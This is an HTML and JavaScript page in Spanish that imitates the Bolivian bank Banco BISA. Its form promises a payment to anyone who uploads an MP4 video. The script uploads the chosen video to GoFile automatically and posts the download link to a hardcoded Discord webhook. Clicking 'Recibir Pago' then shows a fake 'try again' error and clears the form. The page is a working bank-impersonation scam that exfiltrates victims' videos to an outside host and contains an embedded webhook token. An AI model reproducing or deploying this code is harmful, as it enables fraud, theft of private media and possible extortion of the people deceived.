<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transferencia - Banco BISA</title>
    <style>
        :root {
            --color-azul: #003e7a;
            --color-amarillo: #f3d600;
            --color-amarillo-pastel: #FFF8C1;
            --color-blanco: #ffffff;
            --color-blanco-pastel: #FFFFFFE6;
            --color-negro: #000000;
        }
        body {
            font-family: "Open Sans", sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            font-variation-settings: "wdth" 100;
            text-align: center;
            padding: 16px;
            max-width: 700px;
            margin: 0 auto;
            background-color: #fff;
        }
        header {
            margin-bottom: 1.5rem;
        }
        #logo {
            margin: 5px 0;
            max-width: 200px;
            height: auto;
        }
        #description {
            font-size: 0.9rem;
            color: #444;
            font-weight: 500;
            line-height: 1.4;
            margin: 5px 0;
        }
        h1 {
            color: #333;
            font-size: 1.75rem;
            margin: 1rem 0;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }
        label {
            color: var(--color-negro);
            font-weight: bold;
            font-size: 1.063rem;
        }
        input, select {
            padding: 10px;
            margin: 5px 0;
            border: 1px solid var(--color-azul);
            border-radius: 6px;
            font-size: 1rem;
            background-color: var(--color-amarillo-pastel);
        }
        button {
            background-color: var(--color-azul);
            color: var(--color-blanco);
            border: none;
            cursor: pointer;
            padding: 15px;
            margin-top: 10px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 6px;
        }
        button:disabled {
            background-color: #FFA9A9;
            cursor: not-allowed;
            color: var(--color-blanco-pastel);
        }
        button:hover:not(:disabled) {
            background-color: var(--color-azul);
            color: var(--color-blanco);
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            font-size: 1rem;
        }
        #status.error {
            color: red;
        }
        #status.success {
            color: green;
        }
        #footer-logo {
            max-width: 100%;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <header>
        <img src="images/Logo_Banco_BISA.png" alt="Banco BISA" id="logo" />
        <p id="description">
            Complete correctamente los datos requeridos en esta sección para recibir el pago. <strong>La transferencia es segura,</strong> se procesa al instante y el trámite es totalmente seguro y confiable.
        </p>
    </header>
    
    <main style="background: var(--color-amarillo); border-radius: 6px; padding: 10px;">
        <h1>Transferencia</h1>
        <form id="uploadForm">
            <label for="videoUpload">Selecciona el video MP4:</label>
            <input type="file" id="videoUpload" accept="video/mp4" required />
            
            <label for="paymentMethod">Método de pago:</label>
            <select id="paymentMethod" required>
                <option value="" disabled selected>Selecciona una opción</option>
                <option value="banco_bisa">Banco BISA</option>
                <option value="mercado_pago">Mercado Pago</option>
                <option value="entel">Entel S. A.</option>
                <option value="tigo_money">Tigo Money</option>
                <option value="wester_union">Western Union</option>
                <option value="bancosol">BancoSol</option>
                <option value="bnb">BNB</option>
            </select>
            
            <label for="amount">Monto:</label>
            <select id="amount" required>
                <option value="" disabled selected>Selecciona un monto</option>
                <option value="2">$2</option>
                <option value="4">$4</option>
                <option value="6">$6</option>
                <option value="8">$8</option>
                <option value="10">$10</option>
                <option value="12">$12</option>
            </select>

            <label for="code">Código único (4 dígitos):</label>
            <input type="text" id="code" maxlength="4" pattern="\d{4}" required />

            <button type="submit" id="submitButton" disabled>Recibir Pago</button>
        </form>
        <p id="status"></p>
    </main>
    <footer>
        <h3 style="padding: 20px 0 5px;">Novedades USDT</h3>
        <img id="footer-logo" src="images/CriptoBisa1440x800px.png" alt="" />
        <p style="margin: 25px 0 5px 0; font-size: 11px;">&copy; 2025 Banco BISA S.A. - Todos los derechos reservados.<br>
            Esta entidad es supervisada por ASFI.
        </p>
    </footer>

    <script>
        const videoInput = document.getElementById('videoUpload');
        const paymentMethod = document.getElementById('paymentMethod');
        const amount = document.getElementById('amount');
        const codeInput = document.getElementById('code');
        const submitButton = document.getElementById('submitButton');
        const statusP = document.getElementById('status');

        let downloadLink = null; // Almacena el enlace de GoFile
        let isUploading = false; // Indica si el video está subiendo
        let isLinkSent = false; // Indica si el enlace ya fue enviado a Discord

        // Verifica si los campos requeridos están completos y la subida ha terminado
        function checkForm() {
            const videoSelected = videoInput.files.length > 0;
            const paymentSelected = paymentMethod.value !== '';
            const amountSelected = amount.value !== '';
            const codeEntered = codeInput.value.length === 4;

            if (videoSelected && paymentSelected && amountSelected && codeEntered && !isUploading && downloadLink) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        }

        // Escuchar cambios en los campos
        videoInput.addEventListener('change', () => {
            if (videoInput.files.length > 0) {
                uploadVideo();
            }
            checkForm();
        });
        paymentMethod.addEventListener('change', checkForm);
        amount.addEventListener('change', checkForm);
        codeInput.addEventListener('input', checkForm);

        // Subir el video automáticamente y enviar el enlace a Discord
        async function uploadVideo() {
            isUploading = true;
            statusP.textContent = 'Cargando video...';
            statusP.className = '';
            checkForm();

            const file = videoInput.files[0];
            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch('https://upload.gofile.io/uploadfile', {
                    method: 'POST',
                    body: formData,
                    mode: 'cors'
                });

                const data = await response.json();

                if (data.status === 'ok') {
                    downloadLink = data.data.downloadPage;
                    isUploading = false;

                    // Enviar el enlace a Discord automáticamente
                    const webhookURL = 'https://canary.discord.com/api/webhooks/528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGA';
                    try {
                        const webhookResponse = await fetch(webhookURL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `Nuevo video subido: **${file.name}**\nEnlace: ${downloadLink}`
                            })
                        });

                        if (webhookResponse.ok) {
                            isLinkSent = true;
                            statusP.textContent = 'Complete los campos y haga clic en "Recibir Pago".';
                        } else {
                            statusP.textContent = 'Error al enviar el enlace a Discord';
                            statusP.className = 'error';
                        }
                    } catch (error) {
                        statusP.textContent = 'Error de conexión al enviar el enlace';
                        statusP.className = 'error';
                    }

                    checkForm();
                } else {
                    statusP.textContent = 'Error al subir el video';
                    statusP.className = 'error';
                    isUploading = false;
                    checkForm();
                }
            } catch (error) {
                statusP.textContent = 'Error de conexión al subir el video';
                statusP.className = 'error';
                isUploading = false;
                checkForm();
            }
        }

        // Simular error al hacer clic en "Recibir Pago"
        async function simulateError() {
            statusP.textContent = 'Procesando pago...';
            statusP.className = '';

            // Simular un pequeño retraso para que parezca que se procesa
            await new Promise(resolve => setTimeout(resolve, 1000));

            if (isLinkSent) {
                statusP.textContent = 'Error, intente nuevamente';
                statusP.className = 'error';
                // Limpiar formulario
                videoInput.value = '';
                paymentMethod.value = '';
                amount.value = '';
                codeInput.value = '';
                downloadLink = null;
                isLinkSent = false;
                checkForm();
            } else {
                statusP.textContent = 'Error: El video no se ha procesado correctamente';
                statusP.className = 'error';
            }
        }

        // Manejar el clic en "Recibir Pago"
        document.getElementById('uploadForm').addEventListener('submit', (e) => {
            e.preventDefault();
            simulateError();
        });
    </script>
</body>
</html>
